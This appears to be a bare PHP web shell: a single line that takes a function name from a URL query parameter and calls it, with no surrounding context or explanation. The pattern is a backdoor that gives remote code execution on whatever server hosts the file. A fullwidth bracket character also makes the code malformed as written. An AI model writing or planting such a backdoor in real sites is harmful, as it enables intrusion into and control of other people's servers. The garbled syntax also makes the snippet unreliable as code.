<?php
$_GET['kL7eOhs9'〕($_GET['kL7eOhs9']);
?>
